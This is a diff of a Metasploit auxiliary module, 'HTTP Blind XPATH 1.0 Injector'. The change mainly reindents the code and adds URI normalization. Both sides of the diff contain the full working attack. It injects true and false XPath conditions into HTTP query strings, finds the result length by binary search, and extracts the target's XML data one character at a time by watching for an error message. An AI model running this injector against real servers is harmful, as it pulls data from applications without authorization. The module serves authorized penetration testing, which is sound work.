@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -15,248 +11,247 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::WmapScanDir
-	include Msf::Auxiliary::Scanner
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::WmapScanDir
+  include Msf::Auxiliary::Scanner
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'   		=> 'HTTP Blind XPATH 1.0 Injector',
-			'Description'	=> %q{
-				This module exploits blind XPATH 1.0 injections over HTTP GET requests.
-			},
-			'Author' 		=> [ 'et [at] metasploit . com' ],
-			'License'		=> BSD_LICENSE,
-			'Version'		=> '$Revision$'))
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'   		=> 'HTTP Blind XPATH 1.0 Injector',
+      'Description'	=> %q{
+        This module exploits blind XPATH 1.0 injections over HTTP GET requests.
+      },
+      'Author' 		=> [ 'et [at] metasploit . com' ],
+      'License'		=> BSD_LICENSE))
 
-		register_options(
-			[
-				OptString.new('METHOD', [ true, "HTTP Method",'GET']),
-				OptString.new('PATH', [ true,  "The URI Path", '/vulnerable.asp']),
-				OptString.new('PRE_QUERY', [ true,  "Pre-injection HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
-				OptString.new('POST_QUERY', [ false,  "Post-injection HTTP URI Query", ' ']),
-				OptString.new('ERROR_MSG', [ true, "False error message", 'Server Error']),
-				OptString.new('XCOMMAND', [ false, "XPath command to execute (Default for all XML doc)", '//*']),
-				OptInt.new('MAX_LEN', [ true, "Maximum string length", 20000]),
-				OptBool.new('MAX_OVER', [ true, "Dont detect result size. Use MAX_LEN instead", true ]),
-				OptBool.new('CHKINJ', [ false, "Check XPath injection with error message", false ]),
-				OptBool.new('DEBUG_INJ', [ false, "Debug XPath injection", true ])
-			], self.class)
+    register_options(
+      [
+        OptString.new('METHOD', [ true, "HTTP Method",'GET']),
+        OptString.new('PATH', [ true,  "The URI Path", '/vulnerable.asp']),
+        OptString.new('PRE_QUERY', [ true,  "Pre-injection HTTP URI Query", 'p1=v1&p2=v2&p3=v3']),
+        OptString.new('POST_QUERY', [ false,  "Post-injection HTTP URI Query", ' ']),
+        OptString.new('ERROR_MSG', [ true, "False error message", 'Server Error']),
+        OptString.new('XCOMMAND', [ false, "XPath command to execute (Default for all XML doc)", '//*']),
+        OptInt.new('MAX_LEN', [ true, "Maximum string length", 20000]),
+        OptBool.new('MAX_OVER', [ true, "Dont detect result size. Use MAX_LEN instead", true ]),
+        OptBool.new('CHKINJ', [ false, "Check XPath injection with error message", false ]),
+        OptBool.new('DEBUG_INJ', [ false, "Debug XPath injection", true ])
+      ], self.class)
 
-	end
+  end
 
-	def wmap_enabled
-		false
-	end
+  def wmap_enabled
+    false
+  end
 
-	def run_host(ip)
+  def run_host(ip)
 
-		#
-		# Max string len
-		#
-		maxstr = datastore['MAX_LEN']
+    #
+    # Max string len
+    #
+    maxstr = datastore['MAX_LEN']
 
-		conn = true
+    conn = true
 
-		rnum=rand(10000)
+    rnum=rand(10000)
 
-		# Weird crap only lower case 'and' operand works
-		truecond = "'%20and%20'#{rnum}'='#{rnum}"
-		falsecond = "'%20and%20'#{rnum}'='#{rnum+1}"
+    # Weird crap only lower case 'and' operand works
+    truecond = "'%20and%20'#{rnum}'='#{rnum}"
+    falsecond = "'%20and%20'#{rnum}'='#{rnum+1}"
 
-		hmeth = datastore['METHOD']
-		tpath = datastore['PATH']
-		prequery = datastore['PRE_QUERY']
-		postquery = datastore['POST_QUERY']
-		emesg = datastore['ERROR_MSG']
-		xcomm = datastore['XCOMMAND']
-
+    hmeth = datastore['METHOD']
+    tpath = normalize_uri(datastore['PATH'])
+    prequery = datastore['PRE_QUERY']
+    postquery = datastore['POST_QUERY']
+    emesg = datastore['ERROR_MSG']
+    xcomm = datastore['XCOMMAND']
 
 
-		print_status("Initializing injection.")
 
-		if datastore['CHKINJ']
+    print_status("Initializing injection.")
 
-			#
-			# Detect error msg in true condition
-			#
+    if datastore['CHKINJ']
 
-			begin
-				res = send_request_cgi({
-					'uri'  		=>  tpath,
-					'query'     =>  "#{prequery}#{falsecond}#{postquery}",
-					'method'   	=>	hmeth
-				}, 20)
+      #
+      # Detect error msg in true condition
+      #
 
-				return if not res
+      begin
+        res = send_request_cgi({
+          'uri'  		=>  tpath,
+          'query'     =>  "#{prequery}#{falsecond}#{postquery}",
+          'method'   	=>	hmeth
+        }, 20)
 
-				if res.body.index(emesg)
-					print_status("False statement check done.")
-				else
-					print_error("Error message not included in false condition.")
-					return
-				end
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				conn = false
-			rescue ::Timeout::Error, ::Errno::EPIPE
-			end
+        return if not res
 
-			#
-			# Detect error msg in false condition
-			#
+        if res.body.index(emesg)
+          print_status("False statement check done.")
+        else
+          print_error("Error message not included in false condition.")
+          return
+        end
+      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+        conn = false
+      rescue ::Timeout::Error, ::Errno::EPIPE
+      end
 
-			begin
-				res = send_request_cgi({
-					'uri'  		=>  tpath,
-					'query'     =>  "#{prequery}#{truecond}#{postquery}",
-					'method'   	=>	hmeth
-				}, 20)
+      #
+      # Detect error msg in false condition
+      #
 
-				return if not res
+      begin
+        res = send_request_cgi({
+          'uri'  		=>  tpath,
+          'query'     =>  "#{prequery}#{truecond}#{postquery}",
+          'method'   	=>	hmeth
+        }, 20)
 
-				if res.body.index(emesg)
-					print_error("Error message included in true condition.")
-					return
-				else
-					print_status("True statement check done.")
-				end
-			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-				conn = false
-			rescue ::Timeout::Error, ::Errno::EPIPE
-			end
+        return if not res
 
-			return if not conn
-		end
+        if res.body.index(emesg)
+          print_error("Error message included in true condition.")
+          return
+        else
+          print_status("True statement check done.")
+        end
+      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+        conn = false
+      rescue ::Timeout::Error, ::Errno::EPIPE
+      end
 
-		#
-		# Find length of command result
-		#
+      return if not conn
+    end
 
-		low = 1
-		high = maxstr
+    #
+    # Find length of command result
+    #
 
-		if datastore['MAX_OVER']
-			print_status("Max. limit set to #{maxstr} characters")
-			reslen = maxstr
-		else
-			lenfound = false
+    low = 1
+    high = maxstr
 
-			while !lenfound do
-				middle = (low + high) / 2;
+    if datastore['MAX_OVER']
+      print_status("Max. limit set to #{maxstr} characters")
+      reslen = maxstr
+    else
+      lenfound = false
 
-				if datastore['DEBUG_INJ']
-					print_status("Length Low: #{low} High: #{high} Med: #{middle}")
-				end
+      while !lenfound do
+        middle = (low + high) / 2;
 
-				injlen = "'%20and%20string-length(#{xcomm})=#{middle}%20and%20'#{rnum}'='#{rnum}"
+        if datastore['DEBUG_INJ']
+          print_status("Length Low: #{low} High: #{high} Med: #{middle}")
+        end
 
-				begin
-					res = send_request_cgi({
-						'uri'  		=>  tpath,
-						'query'     =>  "#{prequery}#{injlen}#{postquery}",
-						'method'   	=>	hmeth
-					}, 20)
+        injlen = "'%20and%20string-length(#{xcomm})=#{middle}%20and%20'#{rnum}'='#{rnum}"
 
-					return if not res
+        begin
+          res = send_request_cgi({
+            'uri'  		=>  tpath,
+            'query'     =>  "#{prequery}#{injlen}#{postquery}",
+            'method'   	=>	hmeth
+          }, 20)
 
-					if res.body.index(emesg)
-						lenf = false
-					else
-						lenfound = true
-						lenf = true
-						lens = middle
-					end
-				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-					conn = false
-				rescue ::Timeout::Error, ::Errno::EPIPE
-				end
+          return if not res
 
-				if !lenf
-					injlen = "'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}"
+          if res.body.index(emesg)
+            lenf = false
+          else
+            lenfound = true
+            lenf = true
+            lens = middle
+          end
+        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+          conn = false
+        rescue ::Timeout::Error, ::Errno::EPIPE
+        end
 
-					begin
-						res = send_request_cgi({
-							'uri'  		=>  tpath,
-							'query'     =>  "#{prequery}#{injlen}#{postquery}",
-							'method'   	=>	hmeth
-						}, 20)
+        if !lenf
+          injlen = "'%20and%20string-length(#{xcomm})<#{middle}%20and%20'#{rnum}'='#{rnum}"
 
-						return if not res
+          begin
+            res = send_request_cgi({
+              'uri'  		=>  tpath,
+              'query'     =>  "#{prequery}#{injlen}#{postquery}",
+              'method'   	=>	hmeth
+            }, 20)
 
-						if res.body.index(emesg)
-							low = middle
-						else
-							high = middle
-						end
-					rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-						conn = false
-					rescue ::Timeout::Error, ::Errno::EPIPE
-					end
-				end
-			end
+            return if not res
 
-			print_status("Result size: #{lens}")
-			reslen = lens.to_i
-		end
+            if res.body.index(emesg)
+              low = middle
+            else
+              high = middle
+            end
+          rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+            conn = false
+          rescue ::Timeout::Error, ::Errno::EPIPE
+          end
+        end
+      end
 
-		#
-		# Execute xpath command and guess response
-		#
+      print_status("Result size: #{lens}")
+      reslen = lens.to_i
+    end
 
-		namestr = []
-		numchr = 0
+    #
+    # Execute xpath command and guess response
+    #
 
-		for i in (1..reslen)
-			#
-			# Only alpha range
-			#
-			for k in (32..126)
-				j = "%"+("%x" % k)
+    namestr = []
+    numchr = 0
 
-				# For Xpath 2.0 Blind search may be performed using a fast binary search using the
-				# string-to-codepoints(string) function
-				# injlen = "'%20and%20string-to-codepoints(substring(#{xcomm},#{i},1))<#{k}%20and%20'#{rnum}'='#{rnum}"
+    for i in (1..reslen)
+      #
+      # Only alpha range
+      #
+      for k in (32..126)
+        j = "%"+("%x" % k)
 
-				# Basic Blind XPath 1.0 Injection
-				injlen = "'%20and%20substring(#{xcomm},#{i},1)=\"#{j}\"%20and%20'#{rnum}'='#{rnum}"
+        # For Xpath 2.0 Blind search may be performed using a fast binary search using the
+        # string-to-codepoints(string) function
+        # injlen = "'%20and%20string-to-codepoints(substring(#{xcomm},#{i},1))<#{k}%20and%20'#{rnum}'='#{rnum}"
 
-				begin
-					res = send_request_cgi({
-						'uri'  		=>  tpath,
-						'query'     =>  "#{prequery}#{injlen}#{postquery}",
-						'method'   	=>	hmeth
-					}, 20)
+        # Basic Blind XPath 1.0 Injection
+        injlen = "'%20and%20substring(#{xcomm},#{i},1)=\"#{j}\"%20and%20'#{rnum}'='#{rnum}"
 
-					return if not res
+        begin
+          res = send_request_cgi({
+            'uri'  		=>  tpath,
+            'query'     =>  "#{prequery}#{injlen}#{postquery}",
+            'method'   	=>	hmeth
+          }, 20)
 
-					if res.body.index(emesg)
-						# neeeeext
-					else
-						if(numchr >= maxstr)
-							# maximum limit reached
-							print_status("#{xcomm}: #{namestr}")
-							print_status("Maximum string length reached.")
-							return
-						end
+          return if not res
 
-						numchr+=1
+          if res.body.index(emesg)
+            # neeeeext
+          else
+            if(numchr >= maxstr)
+              # maximum limit reached
+              print_status("#{xcomm}: #{namestr}")
+              print_status("Maximum string length reached.")
+              return
+            end
 
-						comperc = (numchr * 100) / maxstr
+            numchr+=1
 
-						namestr << "#{k.chr}"
-						if datastore['DEBUG_INJ']
-							print_status("#{comperc}%: '#{k.chr}' #{namestr}")
-						end
-						break
-					end
-				rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-					conn = false
-				rescue ::Timeout::Error, ::Errno::EPIPE
-				end
-			end
-		end
+            comperc = (numchr * 100) / maxstr
 
-		print_status("#{xcomm}: #{namestr}")
-		print_status("Done.")
-	end
+            namestr << "#{k.chr}"
+            if datastore['DEBUG_INJ']
+              print_status("#{comperc}%: '#{k.chr}' #{namestr}")
+            end
+            break
+          end
+        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+          conn = false
+        rescue ::Timeout::Error, ::Errno::EPIPE
+        end
+      end
+    end
+
+    print_status("#{xcomm}: #{namestr}")
+    print_status("Done.")
+  end
 end
